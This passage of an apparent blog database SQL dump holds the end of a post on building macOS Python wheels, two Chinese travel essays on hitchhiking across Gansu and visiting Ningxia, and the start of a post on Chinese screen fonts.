print(distutils.util.get_platform())\nmacosx-10.6-intel\nYou can install as many pythons as you like, such as 3.3.5 and 3.4.1, so that\nyou can create wheels for Python 3.3 and Python 3.4.\n\nThe final patch for setup.py would make it easy to create powerful Mac\nwheels:\ntry:\n    from wheel.bdist_wheel import bdist_wheel\n\n    class _bdist_wheel(bdist_wheel):\n        def get_tag(self):\n            tag = bdist_wheel.get_tag(self)\n            repl = ''macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64''\n            if tag[2] == ''macosx_10_6_intel'':\n                tag = (tag[0], tag[1], repl)\n            return tag\n\n    cmdclass = {''bdist_wheel'': _bdist_wheel}\nexcept ImportError:\n    cmdclass = {}\n\nsetup(\n    # ...\n    cmdclass=cmdclass,\n    # ...\n)\nI would suggest that you use this patch for binary wheel. A simple renaming\nis not as good as this one patch. This patch would change the platform tag,\nand write the information to the wheel meta:\n# file: mistune-0.4.dist-info/WHEEL\nWheel-Version: 1.0\nGenerator: bdist_wheel (0.24.0)\nRoot-Is-Purelib: false\nTag: cp27-none-macosx_10_6_intel\nTag: cp27-none-macosx_10_9_intel\nTag: cp27-none-macosx_10_9_x86_64\nBut a simple renaming would not add those tags to wheel meta. If you dare\nhave a look at pandas wheel meta:\n# file: pandas-0.14.1.dist-info/WHEEL\nWheel-Version: 1.0\nGenerator: bdist_wheel (0.24.0)\nRoot-Is-Purelib: false\nTag: cp27-none-macosx_10_6_intel\nIt has no tag for macosx_10_9_intel and macosx_10_9_x86_64.\nThis is how I created wheels for mistune.\nI''d try windows later (or never).\n$ python setup.py bdist_wheel upload', NULL, NULL, NULL),
(28, 'http://lepture.com/zh/2014/unexpected-journey-with-lift', '別樣經歷搭車記', '<p>我與阿國是在西寧相遇的。</p>\n<p>清晨的時候，出門去吃早點，正踫着他尋過來。他那時一身暗橘色右衽上衣，下面是尼泊爾掉襠大褲，背一個超大型黑色雨罩登山包，攔腰抱了個鼓，走過來問我客棧在哪裏。</p>\n<p>我向後指了指：「走到底，那個上面有很多彩旗的就是。」其實不是彩旗，是經幡，紅的綠的黃的藍的。</p>\n<p>早飯後我們昨天相約的一行人便包車去青海湖遊玩了，第二次再見時是兩天後。未曾料到接下來的旅程將會一路相伴。</p>\n<p>回來西寧的晚上，他在用客棧的電腦查路線或者攻略。客棧電腦在茶室邊上，我沒有太在意，和茶室裏的其他人在聊天。有一個姑娘會彈吉他，拿了老闆的琴，彈幾首民謠，大家一起隨意唱唱。</p>\n<figure><img alt="在客棧拍照" src="http://dn-lepture.qbox.me/blog/yalaso-girl.jpg/thumbnail" /><figcaption>在客棧拍照，後面的男生真討厭</figcaption></figure><p>晚上睡覺的時候聊起明天的行程，我們同去張掖，這便開始了我的搭車經歷。</p>\n<hr />\n<p>我知道很多搭車出行的故事，可是自己卻不曾搭過，一路上汽車包車列車飛機地走過來的。阿國卻是從拉薩一路搭車到西寧的，頗有點經驗。</p>\n<p>清早時分坐公交車去中心廣場，轉乘城際公交車去大通縣，而後在大通縣再轉公交去鄉下，到良教鄉下車，一邊走一邊等過往的車輛。遇到有車駛過便伸出手，握個拳，豎起大拇指，彷彿「你好棒」的樣子，這是搭車常用手勢。</p>\n<p>阿國說要到鄉下地方才好搭到車，城裏是不會有人搭你的。這當然是經驗之談。</p>\n<p>這一趟搭車算是比較順利，雖然一輛輛的車駛過，完全不理會我們，可是車流量大，終於有一輛轎車停下來了。這個地方是阿國選的，正好是去往張掖的唯一一條國道，車流量較大，更容易搭到車。搭車是個概率事件，需要更大的數據來支撐。</p>\n<p>司機大哥說他在拉薩載過許多搭車的人，但是他不到張掖，只能載了我們十多公里，到三叉路口放我們下車，他要去往另一方向。我們沿去張掖的國道走走停停，不一時又搭上了一輛去張掖的大卡車，紅色外皮的空車，師傅要去張掖運貨。這種大卡車我還是第一次坐，人長得矮，幾乎都爬不上去，坐在卡車上，俯視前方，頗有點君臨天下的意思。</p>\n<p>去往張掖的路上，蜿蜒崎嶇的山路，上上下下，時而飛雪，時而細雨，時而又是豔陽。一路上天氣變化多端，飛雪多是在山上，細雨與殘陽也許是在山腰也許是在山底。有一處山頂積雪不夠厚實，於白色之間雜了一條條土紅，斑馬紋路似的，頗像原始部落裏的紋身。可惜隔了車窗玻璃，又不能停下來選取合適的角度，拍不了相片。</p>\n<p>在嘉峪關搭車更是順利，一到高速路口便搭到了一輛。</p>\n<p>他們青年小夥去新疆做通訊網絡，好像是軍方的項目，不方便多說，一車的各種儀器。開車小哥以前是騎行的，也常常在外面遊玩，特別熱心。我們剛下公交車，到高速路口，他正好經過就停下車，問我們去哪裏。其時後座亦堆滿了儀器，他們便下車，摞了一部分到後備箱。</p>\n<p>車行一半，在高速路上遇到了拋錨的車，似乎沒油了，他們也主動停下車，施以援手，載他們司機到下一個加油站。</p>\n<p>我們在瓜州下車，橫穿高速公路，翻越到國道，繼續搭車到敦煌。高速路下有一片地，龜裂的地表，稀稀疏疏生幾叢草。我們沿國道往敦煌方向走，不久便又搭到車。師傅是四川綿陽人，在敦煌這邊的中石油上班。聊起來，他也在川藏線上載過搭車的人。</p>\n<p>他對敦煌是有點意見的，有一點我也深表認同，敦煌估計是全國唯一一個在火車站與城市之間修收費站的，就是火車站前一點點。如果你要送人去火車站，還不得不過一趟收費站，真是收錢收瘋了。</p>\n<p>細細想來，一路上施以援手的多是之前已經搭過他人的。因爲有過經歷，更能接受一些。</p>\n<p>當然也有不順利的時候。比如在張掖搭車去敦煌，在高速路口處攔車。車流量偏少，一輛輛駛過去，沒有停下來的意思。等了許久也不曾搭到，最好的時候是停下來告訴我們沒有地方坐了。</p>\n<p>高速入口處有一欄大廣告牌，我等得不耐煩了，便坐在陰涼處，拿了 Kindle 看《The Kite Runner》，這是第二遍閱讀了，看 Amir 到 Kabul 找 Sohrab，看 Amir 與 Assef 的對峙，看 Sohrab 射瞎了 Assef 的眼睛，完成了乃父的豪言。</p>\n<p>阿國也席地而坐，豎起他的尼泊爾鼓，敲打着節拍，唱《藍蓮花》。</p>\n<p>後來終於搭到了一輛去高臺的貨車，而高臺交通情況更糟糕，幾乎不可能搭到車。看看時間，只能買了火車票去嘉峪關。</p>\n<p>於我而言搭車過於浪費時間，經濟上考慮並不合算。可是畢竟是另一番經歷，是另一番體驗。敦煌相別後，我便又迴歸正軌，開始了列車之旅。</p>\n<p>與阿國一起的旅途還有其它別樣的經歷，留待下回再敘。</p>', '2014-11-06 23:42:49', 5, '2014-05-27 18:35:00', '2014-05-27 18:35:00', 0, '[["\\u642d\\u8eca", 0.25534454860563105], ["\\u6211\\u5011", 0.23213140782330097], ["\\u5f35\\u6396", 0.18570512625864077], ["\\u963f\\u570b", 0.11606570391165048], ["\\u6566\\u714c", 0.10733501765842718], ["\\u4ed6\\u5011", 0.09285256312932039], ["\\u4e0b\\u8eca", 0.09285256312932039], ["\\u6642\\u5019", 0.09285256312932039], ["\\u4e00\\u8f1b", 0.09285256312932039], ["\\u5ba2\\u68e7", 0.09285256312932039], ["\\u505c\\u4e0b", 0.0907222773453204], ["\\u9806\\u5229", 0.06963942234699029], ["\\u706b\\u8eca", 0.06963942234699029], ["\\u6709\\u9ede", 0.06963942234699029], ["\\u897f\\u5be7", 0.06963942234699029], ["\\u7d93\\u6b77", 0.06963942234699029], ["\\u516c\\u4ea4", 0.06495800687347573], ["\\u9ad8\\u901f", 0.06397533269475728], ["\\u53bb\\u5f80", 0.06296874872970874], ["\\u552f\\u4e00\\u4e00", 0.053983214182524275]]', NULL, NULL, '我與阿國是在西寧相遇的。\n清晨的時候，出門去吃早點，正踫着他尋過來。他那時一身暗橘色右衽上衣，下面是尼泊爾掉襠大褲，背一個超大型黑色雨罩登山包，攔腰抱了個鼓，走過來問我客棧在哪裏。\n我向後指了指：「走到底，那個上面有很多彩旗的就是。」其實不是彩旗，是經幡，紅的綠的黃的藍的。\n早飯後我們昨天相約的一行人便包車去青海湖遊玩了，第二次再見時是兩天後。未曾料到接下來的旅程將會一路相伴。\n回來西寧的晚上，他在用客棧的電腦查路線或者攻略。客棧電腦在茶室邊上，我沒有太在意，和茶室裏的其他人在聊天。有一個姑娘會彈吉他，拿了老闆的琴，彈幾首民謠，大家一起隨意唱唱。\n在客棧拍照，後面的男生真討厭晚上睡覺的時候聊起明天的行程，我們同去張掖，這便開始了我的搭車經歷。\n\n我知道很多搭車出行的故事，可是自己卻不曾搭過，一路上汽車包車列車飛機地走過來的。阿國卻是從拉薩一路搭車到西寧的，頗有點經驗。\n清早時分坐公交車去中心廣場，轉乘城際公交車去大通縣，而後在大通縣再轉公交去鄉下，到良教鄉下車，一邊走一邊等過往的車輛。遇到有車駛過便伸出手，握個拳，豎起大拇指，彷彿「你好棒」的樣子，這是搭車常用手勢。\n阿國說要到鄉下地方才好搭到車，城裏是不會有人搭你的。這當然是經驗之談。\n這一趟搭車算是比較順利，雖然一輛輛的車駛過，完全不理會我們，可是車流量大，終於有一輛轎車停下來了。這個地方是阿國選的，正好是去往張掖的唯一一條國道，車流量較大，更容易搭到車。搭車是個概率事件，需要更大的數據來支撐。\n司機大哥說他在拉薩載過許多搭車的人，但是他不到張掖，只能載了我們十多公里，到三叉路口放我們下車，他要去往另一方向。我們沿去張掖的國道走走停停，不一時又搭上了一輛去張掖的大卡車，紅色外皮的空車，師傅要去張掖運貨。這種大卡車我還是第一次坐，人長得矮，幾乎都爬不上去，坐在卡車上，俯視前方，頗有點君臨天下的意思。\n去往張掖的路上，蜿蜒崎嶇的山路，上上下下，時而飛雪，時而細雨，時而又是豔陽。一路上天氣變化多端，飛雪多是在山上，細雨與殘陽也許是在山腰也許是在山底。有一處山頂積雪不夠厚實，於白色之間雜了一條條土紅，斑馬紋路似的，頗像原始部落裏的紋身。可惜隔了車窗玻璃，又不能停下來選取合適的角度，拍不了相片。\n在嘉峪關搭車更是順利，一到高速路口便搭到了一輛。\n他們青年小夥去新疆做通訊網絡，好像是軍方的項目，不方便多說，一車的各種儀器。開車小哥以前是騎行的，也常常在外面遊玩，特別熱心。我們剛下公交車，到高速路口，他正好經過就停下車，問我們去哪裏。其時後座亦堆滿了儀器，他們便下車，摞了一部分到後備箱。\n車行一半，在高速路上遇到了拋錨的車，似乎沒油了，他們也主動停下車，施以援手，載他們司機到下一個加油站。\n我們在瓜州下車，橫穿高速公路，翻越到國道，繼續搭車到敦煌。高速路下有一片地，龜裂的地表，稀稀疏疏生幾叢草。我們沿國道往敦煌方向走，不久便又搭到車。師傅是四川綿陽人，在敦煌這邊的中石油上班。聊起來，他也在川藏線上載過搭車的人。\n他對敦煌是有點意見的，有一點我也深表認同，敦煌估計是全國唯一一個在火車站與城市之間修收費站的，就是火車站前一點點。如果你要送人去火車站，還不得不過一趟收費站，真是收錢收瘋了。\n細細想來，一路上施以援手的多是之前已經搭過他人的。因爲有過經歷，更能接受一些。\n當然也有不順利的時候。比如在張掖搭車去敦煌，在高速路口處攔車。車流量偏少，一輛輛駛過去，沒有停下來的意思。等了許久也不曾搭到，最好的時候是停下來告訴我們沒有地方坐了。\n高速入口處有一欄大廣告牌，我等得不耐煩了，便坐在陰涼處，拿了 Kindle 看《The Kite Runner》，這是第二遍閱讀了，看 Amir 到 Kabul 找 Sohrab，看 Amir 與 Assef 的對峙，看 Sohrab 射瞎了 Assef 的眼睛，完成了乃父的豪言。\n阿國也席地而坐，豎起他的尼泊爾鼓，敲打着節拍，唱《藍蓮花》。\n後來終於搭到了一輛去高臺的貨車，而高臺交通情況更糟糕，幾乎不可能搭到車。看看時間，只能買了火車票去嘉峪關。\n於我而言搭車過於浪費時間，經濟上考慮並不合算。可是畢竟是另一番經歷，是另一番體驗。敦煌相別後，我便又迴歸正軌，開始了列車之旅。\n與阿國一起的旅途還有其它別樣的經歷，留待下回再敘。', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(29, 'http://lepture.com/zh/2014/a-trip-in-ningxia', '冰與火之歌寧夏記', '<p>我未曾想過要帶厚一點的衣服出門。深圳的春天陽光和煦，西南也是一片明媚，後來輾轉成都北京，又是怡人天氣。畢竟入夏了嘛。也不知是幸運還是不幸，在這五月天裏竟然遇到落雪。倒是賞心美景，只嫌衣着單薄。</p>\n<p>早晨的時候，銀川還有幾點陽光。從客棧出發，乘公車轉遊二線去賀蘭山觀岩畫。但是一直等不到遊二線公車，正巧有輛包車經過，問我去哪裏，便捎上了我。同車的四位要去蘇峪口，我便修改了行程，隨他們去蘇峪口國家森林公園了。</p>\n<p>蘇峪口這邊的山也是賀蘭山脈的一部分，與昨日見到的賀蘭山不同，蘇峪口的山披了綠，全然沒有荒涼之感。</p>\n<p>我們一行人買過票，乘景區公車進去，到松濤山莊下車。第一站是崖壁棧道，崖壁者名不虛實，整個棧道由鋼筋水泥澆築於山壁之上，據聞全長五千兩百米，隨山脈蜿蜒盤旋，可惜最頂處封鎖着，不讓上去。</p>\n<p>走在棧道上，一級級階梯時而平緩時而陡峭。行不多時，忽然有幾點冰粒打到臉上，涼颼颼的，隨階梯而上，不一時便見着稀稀落落下着的霰雪了。他們有三人不太想往上爬了，半山涼亭處便停下來了，只留我與另一人繼續登高。山風瑟瑟，越往上爬雪籽下得越大，而遊客紛紛留照合影，只怕也拍不出什麼風景。</p>\n<p>岩壁上偶爾點綴的幾朵白色小花，黃色花蕊，綠葉襯托，旁邊是破壁而出的幾株小松，還有石上落着的霰雪冰粒。這樣的小景被多數遊客忽略了，這許多的小驚喜卻給我的登山憑添了幾分樂趣。</p>\n<figure><img alt="岩壁上的幾朵小花" src="http://dn-lepture.qbox.me/blog/suyukou-little-flowers.jpg/thumbnail" /><figcaption>岩壁上偶爾點綴的幾朵白色小花</figcaption></figure><p>可惜最頂端的棧道一直不曾開放，我們到開放路段的最頂處時，正好開始封山。隨手拍拍雪景，拍松針上的落雪，可惜效果並不太好。</p>\n<p>下棧道後，霰雪便停了。我們隨後匯合，又去登青松嶺，到半山時又開始下雪。這一次便不是雪籽了，已經化作了雪花。到得青松嶺正是雪花極盛之時，成片成片地在風中飛舞。只恨自己攝影技術太爛，只恨自己攝影器材普通，拍不了此情此景。隨手拍拍，昏暗的畫面裏幾個白點，實在不像話。也只是隨手拍拍，手便冰冷了，大家都不曾料到，單薄的兩件衣服，直凍得哆嗦。</p>\n<p>青松嶺邊上有一處號爲天下第一橋，懸在兩山之間，在這風雪中飄搖。</p>\n<p>從青松嶺下山，走另一邊的櫻桃谷，看漫山櫻花，看雪花飛舞，才覺得此番沒有白來。石階兩邊櫻花盛開，正是雪色花瓣，透露幾筆粉嫩。谷裏風亂，雪花橫飛，甚至時而斜上，往高空飛去。櫻白，雪白，漫山飛舞的白。<a href="http://fz0512.com/">傅真</a>寫博客說有些景色無法描述，需要照片來述說。可是還有一些景色需要親自體驗，它是動態的，相片的靜態無法體現出它的美。也許只是我無法拍出來。</p>\n<figure><img alt="櫻桃谷漫山櫻花" src="http://dn-lepture.qbox.me/blog/suyukou-sakura.jpg/thumbnail" /><figcaption>櫻桃谷漫山櫻花</figcaption></figure><p>讀書的時候，到櫻花盛開時，風聞武大櫻花之名的遊客紛紛趕過來，直把校園擠得水泄不通，那時沒有賞櫻的興致。而此刻，在武大櫻花早已謝去時，在這西北，在這雪中，觀賞雪花點綴着的櫻花，頓覺心曠神怡。</p>\n<figure><img alt="櫻花與雪花" src="http://dn-lepture.qbox.me/blog/suyukou-snow-sakura.jpg/thumbnail" /><figcaption>雪花點綴着的櫻花</figcaption></figure><p>櫻桃谷又是一段長路，上坡下坡，走了許久終於出得山來，正好在公路上遇到回程的大巴。這一路，也不知走過了多少級階梯，怕是不下萬級吧。此番蘇峪口之旅便是寧夏的冰之歌。</p>\n<hr />\n<p>寧夏素有塞上江南的美稱，載我們去沙坡頭的司機道：「天下黃河富寧夏首富中衛。」此言確實不虛。假使氣候不這麼乾燥，以中衛的植被面積，中衛的水流湖泊，你也會誤以爲自己身處江南。</p>\n<p>但是我們要去的沙坡頭卻是一片沙漠，旁邊是黃河。剛到銀川的第一天，去沙湖遊玩，也是一片沙漠，而另一邊卻是湖水。沙漠的光景相仿，遊玩項目亦相仿，沙湖是一個人去的，不比沙坡頭多人一起有趣。</p>\n<figure><img alt="沙湖鳥島鳥籠" src="http://dn-lepture.qbox.me/blog/shahu-birds-island.jpg/thumbnail" /><figcaption>沙湖鳥島鳥籠看起來倒是挺有特色的</figcaption></figure><p>湖南衛視有一個節目叫作「爸爸去哪兒」，有一集便是在沙坡頭拍攝的，中衛各處廣告牌便是「爸爸去哪兒，就去沙坡頭」。我們四人在客棧相約，結伴包車去沙坡頭。客棧是中衛唯一的國際青年旅舍（申請中），叫中衛西北偏北國際青年旅舍，離火車站非常近，老闆是同齡的四川妹子，名字卻顯得男生，喚作陳浩蘭。前一天晚上到客棧時，有早住的陳利嫻姑娘相約明日一起去沙坡頭。</p>\n<p>黃河之水略嫌髒了點，景區遊玩，順流而上，見到沙漠時是一處陡坡沙丘。嫻姑娘說需要兩小時，也太誇張了點，我們脫了鞋爬沙丘，不過二十分鐘，只有金霞姑娘拖了後腿。到沙丘之上，遠觀黃河，觀黃河至彎處，沙漠，綠林，河水，黃綠黃的夾層。在沙丘上拍照，一二三跳，腳向外張開，相機連拍，留下空中佇留瞬間。</p>\n<figure><img alt="沙漠中的駝隊" src="http://dn-lepture.qbox.me/blog/shapotou-desert-camels.jpg/thumbnail" /><figcaption>沙漠中的駝隊</figcaption></figure><p>沙漠多娛樂項目，滑沙，滑草，滑索，駱駝，摩托，越野等等，可惜只騎過了駱駝。可是卻做過了一少有人做的事，深入沙漠一小時。嫻姑娘玩笑，說穿越沙漠去通湖草原吃烤全羊。一路說笑，打鬧遊玩，拍拍照。中途遇到一位返程的小哥，遠遠的在另一條道上，一人行於藍天與黃沙之間，彷彿天下只剩一人，荒涼的孤獨。</p>\n<figure><img alt="沙漠中的小哥" src="http://dn-lepture.qbox.me/blog/shapotou-loneliness.jpg/thumbnail" /><figcaption>沙漠中孤獨的小哥</figcaption></figure><p>最讓人欣喜的是這沙漠中偶爾冒出的幾點小草，不比花棒之類的樹，看起來那麼脆弱的生命也頑強地生存着。烈日炎炎，沙粒燙腳，在這樣的環境裏頑強地生存着。還有沙漠裏的小甲蟲，頂一弧黑色甲殼，歡快地在沙中奔爬着，也不知道有什麼食物可吃的。</p>\n<figure><img alt="沙漠中的小草" src="http://dn-lepture.qbox.me/blog/shapotou-desert-grass.jpg/thumbnail" /><figcaption>沙漠中的小草</figcaption></figure><figure><img alt="沙漠中的花棒樹" src="http://dn-lepture.qbox.me/blog/shapotou-desert-tree.jpg/thumbnail" /><figcaption>沙漠中的花棒樹</figcaption></figure><p>最讓人興奮的卻是滚沙坡，看嫻姑娘放過「滚沙漠」的視頻後，我便時刻惦記着，想體驗一下。終於在沙漠深處尋了一處緩坡，只有我與嫻姑娘兩人，小羅與金霞都沒有興趣。</p>\n<p>我們取下眼鏡，橫躺於沙丘之上，雙手抱頭，稍一使力，打個圈，沿了沙坡就勢滾下，一圈兩圈三圈四圈，頭腦便隨了這滾圈發暈起來，天旋地轉，到受不了了時再使點力阻攔滾落的勢頭，稍微又滾了兩圈才肯定住。這個時候是萬萬站不起來的，只覺得腦海裏有一片天，一直不停旋轉旋轉旋轉。我們便躺在沙上，等候身體恢復。</p>\n<figure><img alt="沙漠中合影" src="http://dn-lepture.qbox.me/blog/shapotou-we-are-here.jpg/thumbnail" /><figcaption>沙漠中合影</figcaption></figure><p>一路說笑，打鬧遊玩，拍拍照，也不知行了多遠，不知有幾分之幾了，看看時間略嫌晚了，於是返程。在這返程途中，用相機定時拍照，留下了唯一的四人合影。沙坡頭之旅便喚作寧夏的火之歌。</p>', '2014-11-06 23:42:49', 5, '2014-05-14 16:56:00', '2014-05-14 16:56:00', 0, '[["\\u6c99\\u6f20", 0.16632175881313888], ["\\u6c99\\u5761", 0.16418383486527777], ["\\u6211\\u5011", 0.14943459378625001], ["\\u6afb\\u82b1", 0.09962306252416667], ["\\u4e2d\\u885b", 0.08301921877013889], ["\\u5cea\\u53e3", 0.07446266542777777], ["\\u96ea\\u82b1", 0.06888240040675], ["\\u9084\\u6709", 0.06641537501611111], ["\\u5ba2\\u68e7", 0.06641537501611111], ["\\u68e7\\u9053", 0.06641537501611111], ["\\u6c99\\u4e18", 0.05841486059597222], ["\\u62cd\\u62cd", 0.05645303145034723], ["\\u9752\\u677e", 0.054479628276388886], ["\\u6c92\\u6709", 0.04981153126208333], ["\\u6843\\u8c37", 0.04981153126208333], ["\\u96a8\\u624b", 0.04981153126208333], ["\\u6642\\u5019", 0.04981153126208333], ["\\u9730\\u96ea", 0.04981153126208333], ["\\u6700\\u9802", 0.04981153126208333], ["\\u98db\\u821e", 0.04981153126208333]]', NULL, NULL, '我未曾想過要帶厚一點的衣服出門。深圳的春天陽光和煦，西南也是一片明媚，後來輾轉成都北京，又是怡人天氣。畢竟入夏了嘛。也不知是幸運還是不幸，在這五月天裏竟然遇到落雪。倒是賞心美景，只嫌衣着單薄。\n早晨的時候，銀川還有幾點陽光。從客棧出發，乘公車轉遊二線去賀蘭山觀岩畫。但是一直等不到遊二線公車，正巧有輛包車經過，問我去哪裏，便捎上了我。同車的四位要去蘇峪口，我便修改了行程，隨他們去蘇峪口國家森林公園了。\n蘇峪口這邊的山也是賀蘭山脈的一部分，與昨日見到的賀蘭山不同，蘇峪口的山披了綠，全然沒有荒涼之感。\n我們一行人買過票，乘景區公車進去，到松濤山莊下車。第一站是崖壁棧道，崖壁者名不虛實，整個棧道由鋼筋水泥澆築於山壁之上，據聞全長五千兩百米，隨山脈蜿蜒盤旋，可惜最頂處封鎖着，不讓上去。\n走在棧道上，一級級階梯時而平緩時而陡峭。行不多時，忽然有幾點冰粒打到臉上，涼颼颼的，隨階梯而上，不一時便見着稀稀落落下着的霰雪了。他們有三人不太想往上爬了，半山涼亭處便停下來了，只留我與另一人繼續登高。山風瑟瑟，越往上爬雪籽下得越大，而遊客紛紛留照合影，只怕也拍不出什麼風景。\n岩壁上偶爾點綴的幾朵白色小花，黃色花蕊，綠葉襯托，旁邊是破壁而出的幾株小松，還有石上落着的霰雪冰粒。這樣的小景被多數遊客忽略了，這許多的小驚喜卻給我的登山憑添了幾分樂趣。\n岩壁上偶爾點綴的幾朵白色小花可惜最頂端的棧道一直不曾開放，我們到開放路段的最頂處時，正好開始封山。隨手拍拍雪景，拍松針上的落雪，可惜效果並不太好。\n下棧道後，霰雪便停了。我們隨後匯合，又去登青松嶺，到半山時又開始下雪。這一次便不是雪籽了，已經化作了雪花。到得青松嶺正是雪花極盛之時，成片成片地在風中飛舞。只恨自己攝影技術太爛，只恨自己攝影器材普通，拍不了此情此景。隨手拍拍，昏暗的畫面裏幾個白點，實在不像話。也只是隨手拍拍，手便冰冷了，大家都不曾料到，單薄的兩件衣服，直凍得哆嗦。\n青松嶺邊上有一處號爲天下第一橋，懸在兩山之間，在這風雪中飄搖。\n從青松嶺下山，走另一邊的櫻桃谷，看漫山櫻花，看雪花飛舞，才覺得此番沒有白來。石階兩邊櫻花盛開，正是雪色花瓣，透露幾筆粉嫩。谷裏風亂，雪花橫飛，甚至時而斜上，往高空飛去。櫻白，雪白，漫山飛舞的白。傅真寫博客說有些景色無法描述，需要照片來述說。可是還有一些景色需要親自體驗，它是動態的，相片的靜態無法體現出它的美。也許只是我無法拍出來。\n櫻桃谷漫山櫻花讀書的時候，到櫻花盛開時，風聞武大櫻花之名的遊客紛紛趕過來，直把校園擠得水泄不通，那時沒有賞櫻的興致。而此刻，在武大櫻花早已謝去時，在這西北，在這雪中，觀賞雪花點綴着的櫻花，頓覺心曠神怡。\n雪花點綴着的櫻花櫻桃谷又是一段長路，上坡下坡，走了許久終於出得山來，正好在公路上遇到回程的大巴。這一路，也不知走過了多少級階梯，怕是不下萬級吧。此番蘇峪口之旅便是寧夏的冰之歌。\n\n寧夏素有塞上江南的美稱，載我們去沙坡頭的司機道：「天下黃河富寧夏首富中衛。」此言確實不虛。假使氣候不這麼乾燥，以中衛的植被面積，中衛的水流湖泊，你也會誤以爲自己身處江南。\n但是我們要去的沙坡頭卻是一片沙漠，旁邊是黃河。剛到銀川的第一天，去沙湖遊玩，也是一片沙漠，而另一邊卻是湖水。沙漠的光景相仿，遊玩項目亦相仿，沙湖是一個人去的，不比沙坡頭多人一起有趣。\n沙湖鳥島鳥籠看起來倒是挺有特色的湖南衛視有一個節目叫作「爸爸去哪兒」，有一集便是在沙坡頭拍攝的，中衛各處廣告牌便是「爸爸去哪兒，就去沙坡頭」。我們四人在客棧相約，結伴包車去沙坡頭。客棧是中衛唯一的國際青年旅舍（申請中），叫中衛西北偏北國際青年旅舍，離火車站非常近，老闆是同齡的四川妹子，名字卻顯得男生，喚作陳浩蘭。前一天晚上到客棧時，有早住的陳利嫻姑娘相約明日一起去沙坡頭。\n黃河之水略嫌髒了點，景區遊玩，順流而上，見到沙漠時是一處陡坡沙丘。嫻姑娘說需要兩小時，也太誇張了點，我們脫了鞋爬沙丘，不過二十分鐘，只有金霞姑娘拖了後腿。到沙丘之上，遠觀黃河，觀黃河至彎處，沙漠，綠林，河水，黃綠黃的夾層。在沙丘上拍照，一二三跳，腳向外張開，相機連拍，留下空中佇留瞬間。\n沙漠中的駝隊沙漠多娛樂項目，滑沙，滑草，滑索，駱駝，摩托，越野等等，可惜只騎過了駱駝。可是卻做過了一少有人做的事，深入沙漠一小時。嫻姑娘玩笑，說穿越沙漠去通湖草原吃烤全羊。一路說笑，打鬧遊玩，拍拍照。中途遇到一位返程的小哥，遠遠的在另一條道上，一人行於藍天與黃沙之間，彷彿天下只剩一人，荒涼的孤獨。\n沙漠中孤獨的小哥最讓人欣喜的是這沙漠中偶爾冒出的幾點小草，不比花棒之類的樹，看起來那麼脆弱的生命也頑強地生存着。烈日炎炎，沙粒燙腳，在這樣的環境裏頑強地生存着。還有沙漠裏的小甲蟲，頂一弧黑色甲殼，歡快地在沙中奔爬着，也不知道有什麼食物可吃的。\n沙漠中的小草沙漠中的花棒樹最讓人興奮的卻是滚沙坡，看嫻姑娘放過「滚沙漠」的視頻後，我便時刻惦記着，想體驗一下。終於在沙漠深處尋了一處緩坡，只有我與嫻姑娘兩人，小羅與金霞都沒有興趣。\n我們取下眼鏡，橫躺於沙丘之上，雙手抱頭，稍一使力，打個圈，沿了沙坡就勢滾下，一圈兩圈三圈四圈，頭腦便隨了這滾圈發暈起來，天旋地轉，到受不了了時再使點力阻攔滾落的勢頭，稍微又滾了兩圈才肯定住。這個時候是萬萬站不起來的，只覺得腦海裏有一片天，一直不停旋轉旋轉旋轉。我們便躺在沙上，等候身體恢復。\n沙漠中合影一路說笑，打鬧遊玩，拍拍照，也不知行了多遠，不知有幾分之幾了，看看時間略嫌晚了，於是返程。在這返程途中，用相機定時拍照，留下了唯一的四人合影。沙坡頭之旅便喚作寧夏的火之歌。', NULL, NULL, NULL),
(30, 'http://lepture.com/zh/2014/chinese-fonts-and-yue-css', '適合閱讀的中文字體', '<p>我時常更新自己的博客程序，也時常更新自己的博客主題。偏右言：「世上有兩種前端工程師，寫博客的，和寫博客的。」我之謂也。我的博客主題一直保持着簡潔的樣式，保持着我認爲適合閱讀的文字排版。</p>\n<p>中文閱讀上，我以爲最大的問題便是字體。不像英文，使用 Web Fonts 的代價相當低廉，中文因爲文字量大的原因，整個字體文件偏大，暫不適合使用 Web Fonts。在這樣的情形下，我們只能儘量利用作業系統自身的字體了。</p>\n<h2>Mac</h2>\n<p>Mac 上默認的中文字體是華文黑體（STHeiti）與華文宋體，我個人認爲質量是不錯的。紙質書的印刷，普遍使用的是宋體，然而在現在的顯示器上，宋體的表現並不令人滿意。</p>\n<p>宋體的結構相比於黑體要複雜許多，比如橫線起筆處微小的回鉤，橫豎撇捺點鉤都沒有那麼簡單。這些細膩的處理在現在的顯示器上都無法完美地體現，也許等到 Retina 普及後，宋體才能重拾其在紙質書的光輝。</p>\n<p>而黑體則不一樣，結構簡潔，形體勻稱，合適在顯示器上閱讀。所以目前我的選擇是黑體。Mac 上還有一款讚譽頗多的黑體，冬青黑體（Hiragino Sans GB）。</p>\n<figure><img alt="華文黑體" src="http://dn-lepture.qbox.me/blog/18px-mac-stheiti.png" /><figcaption>Mac 上 18px 的華文黑體</figcaption></figure><figure><img alt="冬青黑體" src="http://dn-lepture.qbox.me/blog/18px-mac-hiragino.png" /><figcaption>Mac 上 18px 的冬青黑體</figcaption></figure><p>我個人以爲兩者都還不錯，冬青黑體整體看來更爲飽滿，偏扁平，而華文黑體則偏瘦一點，比如你看兩者的「口」字。我個人隨大流，選擇了讚譽頗多的冬青黑體。</p>\n<h2>Windows</h2>\n<p>因爲我個人一直使用的是 Mac，對視窗系統沒有太多了解，只知道中易宋體與微軟雅黑。所以只能對這兩者做對比。</p>\n<figure><img alt="微軟雅黑" src="http://dn-lepture.qbox.me/blog/18px-win-yahei.png" /><figcaption>Windows 上 18px 的微軟雅黑</figcaption></figure><p>也許只是個人原因，微軟雅黑看起來不夠圓潤，甚至有鋸齒感。當然，這與 Windows 的字體渲染有關，非微軟雅黑字體之過。但是也有人覺得 Windows 上的微軟雅黑比 Mac 上的冬青黑體更好，嫌棄 Mac 的字體渲染太模糊。我個人認爲 16px 的中易宋體在 Windows 上是更好的選擇。</p>\n<figure><img alt="中易宋體" src="http://dn-lepture.qbox.me/blog/16px-win-simsun.png" /><figcaption>Windows 上 16px 的中易宋體</figcaption></figure><p>Windows 的字體渲染偏銳利，微軟雅黑的顯示就有點尷尬，但是中易宋體是點陣字體，正好利用到了 Windows 